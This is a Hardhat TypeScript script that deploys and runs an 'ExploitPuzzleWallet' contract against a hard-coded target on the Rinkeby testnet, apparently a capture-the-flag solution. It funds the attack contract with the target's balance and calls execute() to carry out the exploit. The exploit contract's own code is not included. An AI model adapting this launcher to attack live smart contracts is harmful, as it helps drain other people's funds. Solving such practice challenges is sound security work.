import { ethers } from 'hardhat'
import { ExploitPuzzleWallet } from '../types/typechain/ExploitPuzzleWallet'
import 'dotenv/config'

async function main() {
  const targetAddr = '0x5F76e6C9b176D30A0d6b68EFA946e30868be2c74'

  const attackerWallet = new ethers.Wallet(
    process.env.DEV_WALLET as string,
    ethers.provider
  )

  const factory = await ethers.getContractFactory(
    'ExploitPuzzleWallet',
    attackerWallet
  )
  const exploit = (await factory.deploy(targetAddr)) as ExploitPuzzleWallet

  console.log('Deploying contract...')
  await exploit.deployed()
  console.log(exploit.address)

  console.log('Contract deployed, adding funds...')
  const fundsTx = await attackerWallet.sendTransaction({
    to: exploit.address,
    value: await ethers.provider.getBalance(targetAddr)
  })
  await fundsTx.wait()

  console.log('Funds added, executing exploit...')
  const expTx = await exploit.execute({ gasLimit: 800000 })
  console.log('https://rinkeby.etherscan.io/tx/' + expTx.hash)

  console.log('Waiting for Tx for be mined...')
  await expTx.wait()
  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
